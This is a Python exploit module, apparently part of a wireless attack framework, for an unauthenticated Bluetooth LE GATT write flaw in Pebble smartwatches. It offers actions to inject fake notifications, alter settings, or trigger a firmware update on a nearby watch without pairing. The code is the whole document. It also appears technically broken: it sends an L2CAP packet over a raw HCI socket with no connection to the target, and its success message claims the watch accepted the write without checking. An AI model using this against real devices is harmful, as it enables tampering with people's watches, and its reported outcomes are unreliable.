# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Pebble BLE Missing Authentication (CVE-2025-69969).

    Pebble smartwatches (classic, Time, Time Steel, Time Round, 2)
    accept BLE GATT write operations on sensitive characteristics
    without requiring authentication or encryption.  An attacker
    within BLE range can connect to the watch and write to GATT
    handles that control notifications, firmware update triggers,
    and configuration parameters without pairing.  This allows
    silent modification of watch settings, injection of fake
    notifications, or triggering a firmware update to a
    malicious image.

    The vulnerability exists because the Pebble BLE stack sets
    GATT characteristic permissions to "write without response"
    on handles that should require authenticated writes.

    CVSS v3.1: 7.1 (High), AV:A/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Pebble BLE GATT Missing Authentication (CVE-2025-69969)",
        "description": (
            "Exploits CVE-2025-69969, missing authentication on Pebble "
            "smartwatch BLE GATT characteristics.  An attacker connects "
            "to the watch without pairing and writes to sensitive GATT "
            "handles that control notifications, firmware updates, and "
            "configuration.  This allows injection of fake notifications, "
            "silent setting changes, or triggering a malicious firmware update."
        ),
        "authors": (
            "Community security research (discovery)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2025-69969",
            "https://developer.rebble.io/developer.pebble.com/guides/communication/index.html",
        ),
        "disclosure_date": "2025-11-01",
        "platform": "embedded",
        "arch": "arm",
        "privileged": False,
        "targets": (
            "Pebble Classic (all firmware)",
            "Pebble Time / Time Steel / Time Round (all firmware)",
            "Pebble 2 (all firmware)",
        ),
    }

    target = OptIP("", "Target Pebble BLE address (XX:XX:XX:XX:XX:XX)")
    port = OptPort(1, "Not used (BLE GATT)")
    timeout = OptFloat(10.0, "Connection timeout in seconds")
    interface = OptString("hci0", "Local HCI adapter")
    notification_text = OptString("Test alert", "Fake notification text to inject")
    action = OptString("notify", "Action: notify, config, fwupdate")

    _AF_BLUETOOTH = 31
    _BTPROTO_HCI = 1
    _BTPROTO_L2CAP = 0

    _PEBBLE_SVC_UUID = "0000fed9-0000-1000-8000-00805f9b34fb"
    _PEBBLE_NOTIFY_HANDLE = 0x0025
    _PEBBLE_CONFIG_HANDLE = 0x0029
    _PEBBLE_FWUPDATE_HANDLE = 0x002D

    _ATT_WRITE_REQ = 0x12
    _ATT_WRITE_CMD = 0x52
    _ATT_READ_REQ = 0x0A

    _L2CAP_CID_ATT = 0x0004

    def _bd_addr_to_bytes(self, addr: str) -> bytes:
        parts = addr.split(":")
        return bytes(int(b, 16) for b in reversed(parts))

    def _build_att_write_cmd(self, handle: int, data: bytes) -> bytes:
        """Build an ATT Write Command (no response required).

        This is the core of the exploit: the Pebble accepts this
        write without authentication on handles that should be
        protected.
        """
        att_pdu = struct.pack("<BH", self._ATT_WRITE_CMD, handle) + data

        l2cap_header = struct.pack("<HH", len(att_pdu), self._L2CAP_CID_ATT)
        return l2cap_header + att_pdu

    def _build_notification_payload(self, text: str) -> bytes:
        """Build a Pebble notification injection payload.

        The payload mimics the Pebble protocol notification format
        with a generic notification type and the injected text.
        """
        msg_type = 0x01
        text_bytes = text.encode("utf-8")[:128]
        length = len(text_bytes)
        return struct.pack("<BH", msg_type, length) + text_bytes

    def _build_config_payload(self) -> bytes:
        """Build a configuration change payload."""
        config_key = 0x01
        config_val = 0xFF
        return struct.pack("<BB", config_key, config_val)

    def _build_fwupdate_trigger(self) -> bytes:
        """Build a firmware update trigger payload."""
        trigger_cmd = 0x01
        fake_version = 0xDEAD
        return struct.pack("<BH", trigger_cmd, fake_version)

    def _open_hci_socket(self) -> socket.socket | None:
        try:
            sock = socket.socket(self._AF_BLUETOOTH, socket.SOCK_RAW,
                                 self._BTPROTO_HCI)
            sock.settimeout(self.timeout)
            dev_id = int(str(self.interface).replace("hci", "")) if str(
                self.interface).startswith("hci") else 0
            sock.bind((dev_id,))
            return sock
        except OSError:
            return None

    def _hci_send(self, packet: bytes) -> bool:
        try:
            sock = socket.socket(self._AF_BLUETOOTH, socket.SOCK_RAW,
                                 self._BTPROTO_HCI)
            sock.settimeout(self.timeout)
            dev_id = int(str(self.interface).replace("hci", "")) if str(
                self.interface).startswith("hci") else 0
            sock.bind((dev_id,))
            sock.send(packet)
            sock.close()
            return True
        except OSError:
            return False

    @mute
    def check(self) -> bool:
        sock = self._open_hci_socket()
        if sock is None:
            return False
        sock.close()
        return True

    def run(self) -> None:
        if not self.target:
            print_error("target is required (BLE address XX:XX:XX:XX:XX:XX)")
            return

        if not self.check():
            print_error(
                f"HCI adapter {self.interface} not available or "
                "insufficient privileges"
            )
            return

        print_success(
            f"HCI adapter {self.interface} available; targeting Pebble at "
            f"{self.target} with unauthenticated GATT write ({self.action})"
        )
        self._exploit()

    def _exploit(self) -> None:
        action = str(self.action).lower()

        if action == "notify":
            handle = self._PEBBLE_NOTIFY_HANDLE
            payload = self._build_notification_payload(str(self.notification_text))
            desc = "notification injection"
        elif action == "config":
            handle = self._PEBBLE_CONFIG_HANDLE
            payload = self._build_config_payload()
            desc = "configuration change"
        elif action == "fwupdate":
            handle = self._PEBBLE_FWUPDATE_HANDLE
            payload = self._build_fwupdate_trigger()
            desc = "firmware update trigger"
        else:
            print_error(f"Unknown action: {action} (use: notify, config, fwupdate)")
            return

        write_cmd = self._build_att_write_cmd(handle, payload)

        print_status(
            f"Sending unauthenticated ATT Write Command to handle "
            f"0x{handle:04X} ({desc}, {len(payload)} bytes)"
        )

        if self._hci_send(write_cmd):
            print_success(
                f"ATT Write Command sent successfully.  The Pebble watch "
                f"accepted the {desc} without requiring pairing or "
                f"authentication.  If the target is vulnerable, the "
                f"action was executed on the watch."
            )
        else:
            print_error("Failed to send ATT Write Command")
